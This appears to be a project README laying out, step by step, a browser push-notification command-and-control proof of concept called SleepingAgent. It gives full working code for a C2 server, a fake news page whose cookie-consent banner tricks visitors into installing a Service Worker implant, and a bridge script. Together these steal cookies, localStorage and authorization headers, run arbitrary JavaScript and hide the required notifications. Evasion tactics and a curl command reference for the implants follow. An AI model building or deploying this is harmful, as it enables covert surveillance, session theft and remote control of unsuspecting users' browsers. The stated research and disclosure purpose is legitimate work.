readme2

**Architecture:** A Node.js Express C2 server generates VAPID keys and stores push subscriptions. A fake GDPR cookie consent banner on a landing page tricks the user into granting push permissions. A Service Worker (SW) receives encrypted push commands, executes them (beacon, cookie/localStorage exfil, fetch interception), attempts to suppress the required notification, and POSTs results back to the C2. A client bridge script runs in open tabs to give the SW access to data it cannot reach directly (document.cookie, localStorage).
 
**Tech Stack:** Node.js, Express, web-push npm package, Vanilla JS Service Worker, HTML/CSS landing page, curl for C2 control
 
**Research Question Being Tested:** Can Chrome's mandatory "show notification on every push" requirement be bypassed by showing then immediately closing a notification programmatically? Three possible outcomes: (1) notification never appears = full bypass, (2) flashes <100ms = partial bypass, (3) stays visible = need alternative technique.
 
---
 
## Project Structure
 
```
sleepingagent/
├── server.js              # C2 server
├── package.json
├── public/
│   ├── index.html         # Fake landing page with consent banner
│   ├── sw.js              # Service Worker implant
│   └── bridge.js          # Client-side bridge for SW<->page comms
└── docs/
    └── plans/
        └── 2026-02-18-sleepingagent.md
```
 
---
 
## Task 1: Project Bootstrap
 
**Files:**
- Create: `package.json`
- Create: `server.js`
 
**Step 1: Init Node project**
 
```bash
mkdir -p sleepingagent/public sleepingagent/docs/plans
cd sleepingagent
npm init -y
npm install express web-push
```
 
**Step 2: Generate VAPID keys (run once, hardcode output)**
 
```bash
node -e "const wp = require('web-push'); const k = wp.generateVAPIDKeys(); console.log(JSON.stringify(k, null, 2))"
```
 
Save the output - you will paste the keys into server.js and index.html.
 
**Step 3: Verify deps installed**
 
```bash
ls node_modules | grep -E "express|web-push"
```
 
Expected output: both `express` and `web-push` listed.
 
**Step 4: Commit**
 
```bash
git init
echo "node_modules/" > .gitignore
git add .
git commit -m "feat: bootstrap sleepingagent project"
```
 
---
 
## Task 2: C2 Server (server.js)
 
**Files:**
- Create: `server.js`
 
**What it does:**
- Serves static files from `/public`
- POST `/subscribe` - receives and stores push subscriptions from implanted browsers
- POST `/exfil` - receives stolen data from SW, logs to console
- POST `/c2/send` - sends a push command to all subscribed implants
- GET `/c2/status` - shows how many active implants exist
 
**Step 1: Create server.js**
 
```javascript
const express = require('express');
const webpush = require('web-push');
const path = require('path');
 
const app = express();
app.use(express.json());
app.use(express.static('public'));
 
// Paste your generated VAPID keys here
const VAPID_PUBLIC_KEY  = 'PASTE_PUBLIC_KEY_HERE';
const VAPID_PRIVATE_KEY = 'PASTE_PRIVATE_KEY_HERE';
 
webpush.setVapidDetails(
  'mailto:research@sleepingagent.local',
  VAPID_PUBLIC_KEY,
  VAPID_PRIVATE_KEY
);
 
let subscriptions = [];
 
// Victim's browser POSTs its push subscription here after banner click
app.post('/subscribe', (req, res) => {
  const sub = req.body;
  subscriptions.push(sub);
  console.log(`[+] New implant registered. Total: ${subscriptions.length}`);
  console.log(`[+] Endpoint: ${sub.endpoint}`);
  res.json({ status: 'implanted' });
});
 
// SW POSTs stolen data here
app.post('/exfil', (req, res) => {
  console.log('\n[!] EXFIL RECEIVED:');
  console.log(JSON.stringify(req.body, null, 2));
  res.json({ status: 'received' });
});
 
// Send a command to all implants
// Valid commands: beacon, cookies, localstorage, indexeddb, cache, clients, intercept_on, intercept_off
// Example: curl -X POST http://localhost:3000/c2/send -H "Content-Type: application/json" -d '{"command":"beacon"}'
app.post('/c2/send', async (req, res) => {
  const { command, args } = req.body;
  console.log(`\n[C2] Sending: ${command} to ${subscriptions.length} implants`);
 
  const payload = JSON.stringify({ command, args, ts: Date.now() });
 
  const results = await Promise.allSettled(
    subscriptions.map(sub =>
      webpush.sendNotification(sub, payload).catch(err => {
        if (err.statusCode === 410) {
          subscriptions = subscriptions.filter(s => s.endpoint !== sub.endpoint);
          console.log('[-] Dead subscription removed');
        }
        throw err;
      })
    )
  );
 
  const sent   = results.filter(r => r.status === 'fulfilled').length;
  const failed = results.filter(r => r.status === 'rejected').length;
  res.json({ sent, failed, total: subscriptions.length });
});
 
app.get('/c2/status', (req, res) => {
  res.json({ implants: subscriptions.length });
});
 
app.listen(3000, () => {
  console.log('[SleepingAgent C2] http://localhost:3000');
  console.log('[SleepingAgent C2] VAPID Public Key:', VAPID_PUBLIC_KEY);
});
```
 
**Step 2: Verify server starts**
 
```bash
node server.js
```
 
Expected: `[SleepingAgent C2] http://localhost:3000` printed, no errors.
 
**Step 3: Commit**
 
```bash
git add server.js
git commit -m "feat: add C2 server with push, subscribe, exfil endpoints"
```
 
---
 
## Task 3: Landing Page (public/index.html)
 
**Files:**
- Create: `public/index.html`
 
**What it does:** Looks like a legitimate news site with a standard GDPR cookie consent banner. When user clicks "Accept All", it silently registers a Service Worker and subscribes to push notifications. The banner disappears normally. The user has no idea they've been implanted.
 
**Step 1: Create public/index.html**
 
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NewsPortal</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; }
    .header { background: #1a73e8; color: white; padding: 16px 24px; font-size: 20px; font-weight: 600; }
    .content { padding: 40px; max-width: 800px; margin: 0 auto; }
    .content h1 { font-size: 28px; margin-bottom: 16px; color: #333; }
    .content p { color: #666; line-height: 1.6; margin-bottom: 12px; }
    .consent-banner {
      position: fixed; bottom: 0; left: 0; right: 0;
      background: white; border-top: 1px solid #ddd;
      padding: 16px 24px; display: flex; align-items: center;
      justify-content: space-between; box-shadow: 0 -4px 12px rgba(0,0,0,0.1);
      z-index: 9999; gap: 16px;
    }
    .consent-text { font-size: 13px; color: #555; flex: 1; }
    .consent-text a { color: #1a73e8; }
    .btn-accept {
      background: #1a73e8; color: white; border: none;
      padding: 10px 24px; border-radius: 4px; cursor: pointer;
      font-size: 14px; font-weight: 500; white-space: nowrap;
    }
    .btn-reject {
      background: none; border: 1px solid #ddd; padding: 10px 16px;
      border-radius: 4px; cursor: pointer; font-size: 14px;
      color: #555; white-space: nowrap;
    }
  </style>
</head>
<body>
 
<div class="header">NewsPortal</div>
<div class="content">
  <h1>Breaking News Today</h1>
  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam.</p>
  <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident.</p>
</div>
 
<div class="consent-banner" id="banner">
  <div class="consent-text">
    We use cookies and similar technologies to improve your experience.
    By clicking "Accept All", you consent to our use of cookies for analytics and personalized content.
    <a href="#">Privacy Policy</a> | <a href="#">Cookie Policy</a>
  </div>
  <button class="btn-reject" onclick="document.getElementById('banner').style.display='none'">Reject</button>
  <button class="btn-accept" onclick="acceptAndImplant()">Accept All</button>
</div>
 
<script>
// Paste your VAPID public key here (same one from server.js)
const VAPID_PUBLIC_KEY = 'PASTE_PUBLIC_KEY_HERE';
 
function urlBase64ToUint8Array(base64String) {
  const padding = '='.repeat((4 - base64String.length % 4) % 4);
  const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
  const rawData = window.atob(base64);
  return new Uint8Array([...rawData].map(c => c.charCodeAt(0)));
}
 
async function acceptAndImplant() {
  // Hide banner immediately - looks like a normal cookie accept
  document.getElementById('banner').style.display = 'none';
 
  if (!('serviceWorker' in navigator) || !('PushManager' in window)) return;
 
  try {
    // Register SW silently
    const reg = await navigator.serviceWorker.register('/sw.js');
    await navigator.serviceWorker.ready;
 
    // Browser shows its own native permission prompt here
    const permission = await Notification.requestPermission();
    if (permission !== 'granted') return;
 
    // Subscribe to push
    const subscription = await reg.pushManager.subscribe({
      userVisibleOnly: true,
      applicationServerKey: urlBase64ToUint8Array(VAPID_PUBLIC_KEY)
    });
 
    // Send subscription endpoint to C2 - attacker now has persistent access
    await fetch('/subscribe', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(subscription)
    });
 
    // Load bridge for ongoing cookie/localStorage exfil
    const s = document.createElement('script');
    s.src = '/bridge.js';
    document.head.appendChild(s);
 
    console.log('[SleepingAgent] Implant installed');
  } catch (err) {
    // Fail silently
  }
}
</script>
</body>
</html>
```
 
**Step 2: Verify page loads**
 
Start server, open `http://localhost:3000` in Chrome. Should see a news page with a cookie banner.
 
**Step 3: Commit**
 
```bash
git add public/index.html
git commit -m "feat: add fake consent banner landing page"
```
 
---
 
## Task 4: Service Worker Implant (public/sw.js)
 
**Files:**
- Create: `public/sw.js`
 
**What it does:** The persistent implant. Registers itself immediately on install. Listens for push events from the C2. On each push: parses the command, executes it, sends exfil back to C2, then attempts to suppress the mandatory Chrome notification by showing it with empty content and closing it immediately.
 
**THE KEY RESEARCH TEST** is in the push handler: does `showNotification(' ', { silent: true })` followed immediately by `notification.close()` result in zero visible UI to the user?
 
**Step 1: Create public/sw.js**
 
```javascript
// SleepingAgent Service Worker - persistent C2 implant
 
const C2_EXFIL = '/exfil';
 
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
 
// ---- CORE: receive push command, execute, suppress notification ----
self.addEventListener('push', event => {
  let payload = { command: 'beacon' };
  try { payload = event.data.json(); } catch {}
 
  const task = handleCommand(payload).then(result => {
    return Promise.all([
      sendExfil(payload.command, result),
      suppressNotification()
    ]);
  });
 
  event.waitUntil(task);
});
 
// Notification suppression - THE BYPASS ATTEMPT
// Chrome spec requires a visible notification per push.
// We show one with blank content + silent:true, then immediately close it.
// Research question: does any notification appear on screen?
async function suppressNotification() {
  await self.registration.showNotification(' ', {
    body: ' ',
    silent: true,
    tag: 'sa',               // fixed tag - overwrites previous, no stacking
    requireInteraction: false,
    icon: '/favicon.ico'
  });
 
  // Immediately close before user can see it
  const notifs = await self.registration.getNotifications({ tag: 'sa' });
  notifs.forEach(n => n.close());
}
 
// ---- COMMAND HANDLER ----
async function handleCommand({ command, args }) {
  switch (command) {
 
    case 'beacon':
      return {
        alive: true,
        origin: self.location.origin,
        ts: Date.now()
      };
 
    case 'cookies':
      // SW cannot read document.cookie - must ask an open tab via bridge.js
      return await askClient('get_cookies');
 
    case 'localstorage':
      return await askClient('get_localstorage');
 
    case 'indexeddb':
      // SW can access IndexedDB directly - no open tab needed
      try {
        const dbs = await indexedDB.databases();
        return { databases: dbs.map(d => d.name) };
      } catch (e) {
        return { error: e.message };
      }
 
    case 'cache':
      // SW has full Cache Storage access - no open tab needed
      try {
        const names = await caches.keys();
        return { caches: names };
      } catch (e) {
        return { error: e.message };
      }
 
    case 'clients':
      const list = await self.clients.matchAll({ includeUncontrolled: true });
      return list.map(c => ({ id: c.id, url: c.url }));
 
    case 'intercept_on':
      self._intercept = true;
      return { intercepting: true };
 
    case 'intercept_off':
      self._intercept = false;
      return { intercepting: false };
 
    case 'inject':
      // Execute arbitrary JS in an open tab via bridge.js
      if (args && args.script) {
        return await askClient('inject', { script: args.script });
      }
      return { error: 'no script provided' };
 
    default:
      return { error: 'unknown command' };
  }
}
 
// ---- FETCH INTERCEPTION (enabled via intercept_on command) ----
self.addEventListener('fetch', event => {
  if (!self._intercept) return; // transparent by default
 
  const req = event.request.clone();
  req.text().then(body => {
    const auth = event.request.headers.get('authorization');
    if (body || auth) {
      sendExfil('intercept', {
        url: event.request.url,
        method: event.request.method,
        auth,
        body: body.substring(0, 500)
      });
    }
  }).catch(() => {});
  // Always pass through - do NOT block or modify requests (keeps it silent)
});
 
// ---- HELPERS ----
 
// Ask an open tab (via bridge.js) for data SW can't access directly
function askClient(action, data = {}) {
  return new Promise(async resolve => {
    const clients = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
    if (!clients.length) {
      resolve({ error: 'no_tab_open', note: 'will execute on next visit' });
      return;
    }
    const channel = new MessageChannel();
    channel.port1.onmessage = e => resolve(e.data);
    clients[0].postMessage({ action, ...data }, [channel.port2]);
    setTimeout(() => resolve({ error: 'client_timeout' }), 3000);
  });
}
 
// POST data back to C2
async function sendExfil(command, data) {
  try {
    await fetch(C2_EXFIL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command, data, origin: self.location.origin, ts: Date.now() })
    });
  } catch {}
}
```
 
**Step 2: Verify SW registers**
 
Open `http://localhost:3000` in Chrome, click Accept All, allow notifications. Then open DevTools > Application > Service Workers. Should see `sw.js` listed as "activated and running".
 
**Step 3: Commit**
 
```bash
git add public/sw.js
git commit -m "feat: add service worker implant with push handler and notification suppression"
```
 
---
 
## Task 5: Client Bridge (public/bridge.js)
 
**Files:**
- Create: `public/bridge.js`
 
**What it does:** Loaded into open tabs by index.html after implant installs. Listens for postMessage from the SW and responds with data the SW cannot access directly (document.cookie, localStorage, arbitrary JS eval).
 
**Step 1: Create public/bridge.js**
 
```javascript
// SleepingAgent client bridge
// Responds to SW data requests for things only a page context can access
 
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.addEventListener('message', event => {
    const { action, script } = event.data;
    const port = event.ports[0];
    if (!port) return;
 
    switch (action) {
      case 'get_cookies':
        port.postMessage({ cookies: document.cookie, url: location.href });
        break;
 
      case 'get_localstorage':
        const store = {};
        for (let i = 0; i < localStorage.length; i++) {
          const k = localStorage.key(i);
          store[k] = localStorage.getItem(k);
        }
        port.postMessage({ localStorage: store, url: location.href });
        break;
 
      case 'inject':
        try {
          const result = new Function(script)();
          port.postMessage({ result: String(result) });
        } catch (e) {
          port.postMessage({ error: e.message });
        }
        break;
    }
  });
}
```
 
**Step 2: Verify bridge loads**
 
After implant install, open DevTools Console on `http://localhost:3000`. No errors should appear. Bridge loads silently.
 
**Step 3: Commit**
 
```bash
git add public/bridge.js
git commit -m "feat: add client bridge for cookie/localStorage/inject exfil"
```
 
---
 
## Task 6: End-to-End Test
 
**Step 1: Start the server**
 
```bash
node server.js
```
 
**Step 2: Open Chrome, visit http://localhost:3000**
 
Click "Accept All". Allow the notification permission when Chrome prompts.
 
**Step 3: Check implant registered**
 
```bash
curl http://localhost:3000/c2/status
```
 
Expected: `{"implants":1}`
 
**Step 4: Send beacon command**
 
```bash
curl -X POST http://localhost:3000/c2/send \
  -H "Content-Type: application/json" \
  -d '{"command":"beacon"}'
```
 
Watch server terminal for:
```
[!] EXFIL RECEIVED:
{
  "command": "beacon",
  "data": { "alive": true, "origin": "http://localhost:3000", "ts": ... }
}
```
 
**CRITICAL OBSERVATION - record what happens on screen:**
- Did a notification appear? Yes / No
- If yes: how long was it visible? Estimate in milliseconds.
- Did it make a sound?
 
**Step 5: Send cookies command (requires tab open)**
 
```bash
curl -X POST http://localhost:3000/c2/send \
  -H "Content-Type: application/json" \
  -d '{"command":"cookies"}'
```
 
**Step 6: Test persistence - close Chrome completely, reopen**
 
Open a NEW tab to `http://localhost:3000`. Do NOT reload/interact with the page.
 
```bash
curl -X POST http://localhost:3000/c2/send \
  -H "Content-Type: application/json" \
  -d '{"command":"beacon"}'
```
 
Expected: exfil still arrives. SW survived browser restart.
 
**Step 7: Test persistence - clear browser cache**
 
Chrome > Settings > Clear browsing data > check "Cached images and files" ONLY (not cookies, not site data). Clear.
 
Send beacon again. Does exfil still arrive?
 
Note: Service Workers live in site data, not cache. This should still work.
 
**Step 8: Document all findings and commit**
 
```bash
git add -A
git commit -m "test: document e2e results for sleepingagent poc"
```
 
---
 
## Findings to Document
 
After running all tests, record:
 
1. **Notification suppression result:** full bypass / partial (Xms flash) / failed
2. **Persistence across tab close:** yes / no
3. **Persistence across browser restart:** yes / no  
4. **Persistence across cache clear:** yes / no
5. **Persistence across site data clear:** no (expected - SW is cleared with site data)
6. **Fetch interception working:** yes / no
7. **Cookie exfil working (tab open):** yes / no
8. **IndexedDB dump working:** yes / no
 
These findings determine the LinkedIn post angle and severity of the disclosure.
 
---
 
## Alternative Suppression Techniques (if primary fails)
 
If `showNotification + immediate close` is visible, try these in order:
 
**Technique 2: Zero-dimension notification**
```javascript
self.registration.showNotification('', {
  body: '',
  icon: 'data:image/png;base64,iVBORw0KGgo=', // 1x1 transparent png
  badge: 'data:image/png;base64,iVBORw0KGgo=',
  silent: true,
  tag: 'sa'
});
```
 
**Technique 3: Notification replace race**
Show notification A, immediately show notification B with the same tag (replaces A), immediately close B. Does A ever render?
 
**Technique 4: Timed suppression**
Show notification at 3am local time when user is asleep. Less elegant but effective.
 
**Technique 5: Focus event trigger**
Only send push commands when the user's machine is idle (no active window focus events in last 30 minutes). Reduces chance of user noticing flash.
 
---
 
## C2 Command Reference
 
```bash
# Check how many implants are active
curl http://localhost:3000/c2/status
 
# Beacon - confirm implant alive
curl -X POST http://localhost:3000/c2/send -H "Content-Type: application/json" -d '{"command":"beacon"}'
 
# Steal cookies (requires open tab)
curl -X POST http://localhost:3000/c2/send -H "Content-Type: application/json" -d '{"command":"cookies"}'
 
# Steal localStorage (requires open tab)
curl -X POST http://localhost:3000/c2/send -H "Content-Type: application/json" -d '{"command":"localstorage"}'
 
# List IndexedDB databases (no tab needed)
curl -X POST http://localhost:3000/c2/send -H "Content-Type: application/json" -d '{"command":"indexeddb"}'
 
# List open tabs
curl -X POST http://localhost:3000/c2/send -H "Content-Type: application/json" -d '{"command":"clients"}'
 
# Enable fetch interception (captures all XHR/fetch including auth headers)
curl -X POST http://localhost:3000/c2/send -H "Content-Type: application/json" -d '{"command":"intercept_on"}'
 
# Disable fetch interception
curl -X POST http://localhost:3000/c2/send -H "Content-Type: application/json" -d '{"command":"intercept_off"}'
 
# Inject and execute arbitrary JS in open tab
curl -X POST http://localhost:3000/c2/send -H "Content-Type: application/json" -d '{"command":"inject","args":{"script":"return document.title"}}'
